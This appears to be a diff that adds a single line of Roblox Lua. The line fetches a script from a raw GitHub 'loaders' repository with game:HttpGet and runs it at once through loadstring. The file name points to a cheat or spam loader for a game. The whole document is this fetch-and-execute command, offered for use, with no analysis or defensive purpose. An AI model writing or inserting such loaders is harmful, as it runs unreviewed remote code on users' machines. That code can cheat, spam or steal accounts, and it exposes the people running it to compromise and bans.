@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/runaways-beta-spam1-0ok3bpyhmbd1gv.lua"))()
